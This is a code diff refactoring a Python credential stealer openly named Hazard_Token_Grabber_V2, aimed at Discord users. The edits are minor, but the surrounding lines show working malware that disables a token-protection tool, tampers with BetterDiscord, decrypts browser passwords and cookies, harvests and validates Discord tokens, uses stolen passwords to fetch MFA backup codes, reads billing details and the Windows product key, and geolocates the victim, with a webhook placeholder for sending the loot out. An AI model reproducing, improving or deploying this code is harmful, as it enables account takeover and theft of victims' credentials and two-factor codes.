@@ -17,6 +17,8 @@ class Hazard_Token_Grabber_V2:
     def __init__(self):
         self.webhook = "WEBHOOK_HERE"
         self.files = ""
+
+        self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"
@@ -102,6 +104,7 @@ class Hazard_Token_Grabber_V2:
     def bypassTokenProtector(self):
         #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        config = tp+"config.json"
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in\
             ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
@@ -115,7 +118,7 @@ class Hazard_Token_Grabber_V2:
             except Exception:
                 pass 
         try:
-            with open(tp+"config.json") as f:
+            with open(config) as f:
                 item = json.load(f)
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
@@ -131,10 +134,10 @@ class Hazard_Token_Grabber_V2:
                 item['iterations_key'] = 457
                 item['version'] = 69420
 
-            with open(tp+"config.json", 'w') as f:
+            with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
 
-            with open(tp+"config.json", 'a') as f:
+            with open(config, 'a') as f:
                 f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
         except Exception:
             pass
@@ -144,7 +147,7 @@ class Hazard_Token_Grabber_V2:
         with open(bd, "rt", encoding="cp437") as f:
             content = f.read()
             content2 = content.replace("api/webhooks", "RdimoTheGoat")
-        with open(bd, 'w'): pass
+        open(bd, "w").close()
         with open(bd, "wt", encoding="cp437") as f:
             f.write(content2)
 
@@ -203,7 +206,7 @@ class Hazard_Token_Grabber_V2:
             decrypted_pass = self.decrypt_payload(cipher, payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
-        except:
+        except Exception:
             return "Failed to decrypt password"
     
     def grabPassword(self):
@@ -227,13 +230,13 @@ class Hazard_Token_Grabber_V2:
                         f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
                         if "discord" in url.lower():
                             self.discord_psw.append(decrypted_password)
-            except:
+            except Exception:
                 pass
         cursor.close()
         conn.close()
         try:
             os.remove("Loginvault.db")
-        except:
+        except Exception:
             pass
 
     def grabCookies(self):
@@ -249,19 +252,19 @@ class Hazard_Token_Grabber_V2:
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                 for r in cursor.fetchall():
-                    Host = r[0]
+                    host = r[0]
                     user = r[1]
                     encrypted_cookie = r[2]
                     decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
-                    if Host != "":
-                        f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-            except:
+                    if host != "":
+                        f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+            except Exception:
                 pass
         cursor.close()
         conn.close()
         try:
             os.remove("Loginvault.db")
-        except:
+        except Exception:
             pass
 
     def grabTokens(self):
@@ -300,7 +303,7 @@ class Hazard_Token_Grabber_V2:
                     for regex in (self.regex):
                         for token in findall(regex, line):
                             try:
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                                r = requests.get(self.baseurl, headers=self.getheaders(token))
                             except Exception:
                                 pass
                             if r.status_code == 200:
@@ -316,7 +319,7 @@ class Hazard_Token_Grabber_V2:
                         for regex in (self.regex):
                             for token in findall(regex, line):
                                 try:
-                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                 except Exception:
                                     pass
                                 if r.status_code == 200:
@@ -328,7 +331,7 @@ class Hazard_Token_Grabber_V2:
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
             try:
-                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
+                j = requests.get(self.baseurl, headers=self.getheaders(token)).json()
             except Exception:
                 pass
             user = j["username"] + "#" + str(j["discriminator"])
@@ -338,7 +341,7 @@ class Hazard_Token_Grabber_V2:
                     fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
                     for x in self.discord_psw:
                         try:
-                            r = requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
+                            r = requests.post(self.baseurl+"/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
                             for i in r["backup_codes"]:
                                 if i not in self.backup_codes:
                                     self.backup_codes.append(i)
@@ -362,13 +365,13 @@ class Hazard_Token_Grabber_V2:
             email = j["email"]
             phone = j["phone"] if j["phone"] else "No Phone Number attached"
             try:
-                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
             except Exception:
                 pass
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
             try:
-                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
             except Exception:
                 pass
             f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
@@ -389,7 +392,7 @@ class Hazard_Token_Grabber_V2:
         wkey = self.getProductKey()[1]
         ip = country = city = region = googlemap = "None"
         try:
-            data = requests.get("http://ipinfo.io/json").json()
+            data = requests.get("https://ipinfo.io/json").json()
             ip = data['ip']
             city = data['city']
             country = data['country']
